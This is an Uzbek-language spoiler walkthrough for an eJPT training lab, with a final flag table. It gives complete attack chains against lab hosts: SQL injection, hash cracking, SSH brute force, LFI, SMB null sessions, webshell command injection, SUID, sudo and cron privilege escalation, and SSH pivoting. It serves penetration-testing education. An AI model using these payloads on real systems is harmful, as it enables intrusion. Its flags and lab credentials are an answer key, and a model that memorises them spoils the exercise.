# eJPT Amaliy Lab — To'liq Yechim (SPOYLER)

> Avval o'zingiz urinib ko'ring! Bu yerda barcha kill-chain'lar batafsil.
> Buyruqlar `ejpt-attacker` konteyneridan bajariladi (`docker exec -it ejpt-attacker bash`).

## 0) Host discovery + enumeration

```bash
nmap -sn 10.10.20.0/24                      # tirik hostlar: .10 .20 .30 (+ .5 o'zingiz)
nmap -sV -p- 10.10.20.10 10.10.20.20 10.10.20.30
```

- 10.10.20.10 — 80 (http, ACME CMS), 22 (ssh)
- 10.10.20.20 — 21 (ftp), 22 (ssh)
- 10.10.20.30 — 445/139 (smb), 22 (ssh)

---

## 1) web-01 (10.10.20.10) — web SQLi → hash → crack → SSH → root

Bu mashina **oson emas**: web zaifligidan foydalanib parol HASH'ini sizib
chiqarasiz, uni buzasiz (crack), so'ng shu parol bilan SSH qilasiz.

**Enum:** homepage'da ko'rsatkich yo'q — kataloglarni topish kerak:
```bash
dirb http://10.10.20.10 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -X .php,.old,.bak
#  -> /search.php (yashirin), /dashboard.php, /uploads/   (katta ro'yxat — bir necha daqiqa)
```

**a) SQLi (UNION) — parol HASH'larini dump qilish:** `search.php?q=` 2 ustunli (name, price):
```bash
curl "http://10.10.20.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
# -> admin    : $1$acme01$LKXfufFStU2JIHhZ8jBW2/
#    sysadmin : $1$acme02$eJjYQgCVKMy0cZ59zFG9E.   (md5crypt — ochiq matn EMAS!)
#    editor   : $1$acme03$xE1wR2RXoF42CJ0i6pHPh/
```

**b) Hash'ni buzish (john + rockyou):** sysadmin paroli rockyou'da (chuqurroqda) — bir necha daqiqa ketadi:
```bash
echo 'sysadmin:$1$acme02$eJjYQgCVKMy0cZ59zFG9E.' > h.txt
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt h.txt
john --show h.txt          # -> sysadmin:jimmyis22   (admin/editor rockyou bilan buzilmaydi)
```

**c) SSH — buzilgan parol bilan foothold:**
```bash
sshpass -p 'jimmyis22' ssh sysadmin@10.10.20.10
cat /var/www/html/user.txt
```
➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
> (Muqobil yo'l: `dashboard.php`da fayl upload → PHP webshell → `www-data` — xuddi shu user flag.)

**d) Privesc — sudo python3 (GTFOBins):**
```bash
sudo -l                                     # (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{w3b01_sud0_pyth0n_r00t}`

> web-01 root/sysadmin ichki tarmoqqa (10.10.10.0/24) ulangan — bu **pivot nuqtasi** (5-bo'lim).

---

## 1a) web-easy 🟢 (10.10.20.40) — ochiq config → SSH → sudo bash → root

```bash
dirb http://10.10.20.40 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -X .old,.bak,.txt   # -> /config.old
curl http://10.10.20.40/config.old             # -> ssh_user=deploy  ssh_pass=D3ploy2024!
sshpass -p 'D3ploy2024!' ssh deploy@10.10.20.40
cat /home/deploy/user.txt                       # EJPT{3xp0s3d_c0nf1g_ssh}
sudo -l                                         # (root) NOPASSWD: /bin/bash
sudo /bin/bash
cat /root/root.txt                              # EJPT{sud0_b4sh_3z_r00t}
```

## 1b) web-hard 🔴 (10.10.20.50) — LFI → SSH cred → SSH → perl cap_setuid → root

```bash
# view.php?page= — LFI / path traversal (docs/ dan ../ bilan chiqiladi)
curl "http://10.10.20.50/view.php?page=../../../../etc/passwd"       # foydalanuvchilar
curl "http://10.10.20.50/view.php?page=../../../../opt/monitor/deploy_notes.txt"
#   -> user: webadmin   pass: W3bM0n1t0r2024!
sshpass -p 'W3bM0n1t0r2024!' ssh webadmin@10.10.20.50
cat /home/webadmin/user.txt                     # EJPT{lf1_l34ks_ssh_cr3ds}
getcap -r / 2>/dev/null                          # /usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
cat /root/root.txt                              # EJPT{c4p_s3tu1d_p3rl_r00t}
```

---

## 2) linux-02 (10.10.20.20) — FTP hint + SSH → SUID find → root

**a) Anonim FTP:**
```bash
ftp 10.10.20.20        # user: anonymous, parol: (bo'sh)
# get note_to_bob.txt  -> "paroling oddiy lug'atdagi so'z — rockyou bilan topiladi!"
```
Brute-force (rockyou — `coconut` ro'yxat boshiga yaqin, bir necha daqiqa):
`hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://10.10.20.20` → `bob:coconut`.

**b) Foothold:**
```bash
sshpass -p coconut ssh bob@10.10.20.20
cat /home/bob/user.txt
```
➡️ **USER flag:** `EJPT{ftp_ssh_cr4ck_f00th0ld}`

**c) Privesc — SUID find:**
```bash
find / -perm -4000 -type f 2>/dev/null      # -> /usr/bin/find SUID!
find . -exec /bin/sh -p \;                  # root shell (euid=0)
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{su1d_f1nd_r00t_esc}`

---

## 3) smb-03 (10.10.20.30) — SMB null session → cred → root

**a) SMB enumeration (null session):**
```bash
smbclient -L //10.10.20.30 -N              # share: public
smbclient //10.10.20.30/public -N
smb: \> get credentials.txt
# -> carol : Fil3s3rv3r2025
```

**b) Foothold:**
```bash
sshpass -p Fil3s3rv3r2025 ssh carol@10.10.20.30
cat /home/carol/user.txt
```
➡️ **USER flag:** `EJPT{smb_null_cr3ds_l00t}`

**c) Privesc — yoziladigan root skript (cron-simulyatsiya):**
```bash
ls -la /opt/maintenance/cleanup.sh          # -rwxrwxrwx, root har 20s ishga tushiradi
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /opt/maintenance/cleanup.sh
sleep 25
/tmp/rootbash -p                            # euid=0
cat /root/root.txt
```
➡️ **ROOT flag:** `EJPT{cr0n_wr1t4bl3_r00t}`

---

## 4) PIVOT: web-01 → internal-04 (10.10.10.20) — FINAL

`internal-04` hujumchi tarmog'ida **yo'q** — u faqat `internalnet`da. web-01 esa ikkala tarmoqda. Shuning uchun web-01'ni "ko'prik" qilamiz.

**Eng oddiy yo'l (web-01 shell orqali):**
```bash
# web-01'dagi webshell (yoki sysadmin ssh) ichki hostni ko'radi:
curl "http://10.10.20.10/uploads/sh.php?c=curl -s http://10.10.10.20:8080/"
# Command injection (ping ?host= zaif):
curl "http://10.10.20.10/uploads/sh.php?c=curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt'"
```

**"Toza" pivot (proxychains + ssh dynamic port forward):**
```bash
# web-01'da sysadmin bilan SOCKS proxy ochamiz:
sshpass -p 'jimmyis22' ssh -f -N -D 1080 sysadmin@10.10.20.10
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
```
➡️ **FINAL flag:** `EJPT{p1v0t_1nt3rnal_cmd1nj}`

---

## Barcha flaglar

| # | Mashina | Flag |
|---|---|---|
| 0 | web-easy (user) | `EJPT{3xp0s3d_c0nf1g_ssh}` |
| 0 | web-easy (root) | `EJPT{sud0_b4sh_3z_r00t}` |
| 0 | web-hard (user) | `EJPT{lf1_l34ks_ssh_cr3ds}` |
| 0 | web-hard (root) | `EJPT{c4p_s3tu1d_p3rl_r00t}` |
| 1 | web-01 (user) | `EJPT{w3b_upl04d_rce_www_data}` |
| 2 | web-01 (root) | `EJPT{w3b01_sud0_pyth0n_r00t}` |
| 3 | linux-02 (user) | `EJPT{ftp_ssh_cr4ck_f00th0ld}` |
| 4 | linux-02 (root) | `EJPT{su1d_f1nd_r00t_esc}` |
| 5 | smb-03 (user) | `EJPT{smb_null_cr3ds_l00t}` |
| 6 | smb-03 (root) | `EJPT{cr0n_wr1t4bl3_r00t}` |
| 7 | internal-04 (final) | `EJPT{p1v0t_1nt3rnal_cmd1nj}` |

Flaglarni portalning **«Amaliy Lab»** sahifasida topshirib, progressni kuzating.
